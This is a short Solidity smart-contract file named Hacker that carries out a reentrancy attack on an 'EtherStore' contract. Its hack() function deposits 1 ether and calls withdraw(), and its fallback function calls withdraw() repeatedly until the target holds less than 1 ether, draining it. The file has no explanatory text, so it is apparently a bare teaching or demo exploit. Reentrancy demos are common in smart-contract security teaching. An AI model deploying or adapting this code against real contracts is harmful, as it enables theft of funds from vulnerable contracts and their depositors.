// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherStore_Hack {
    function depositFounds() external payable;
    function withdraw() external;
}

contract Hacker {
    IEtherStore_Hack public EtherStore_Hack;

    constructor(address addressStore) {
        EtherStore_Hack = IEtherStore_Hack(addressStore);
    }

    function hack() external payable {
        require(msg.value == 1 ether, "ERROR.");

        EtherStore_Hack.depositFounds{value: 1 ether}();
        EtherStore_Hack.withdraw();
    }

    fallback() external payable {
        if(address(EtherStore_Hack).balance >= 1 ether) {
            EtherStore_Hack.withdraw();
        }
    }

    function getBalances() public view returns (uint256) {
        return address(this).balance;
    }
}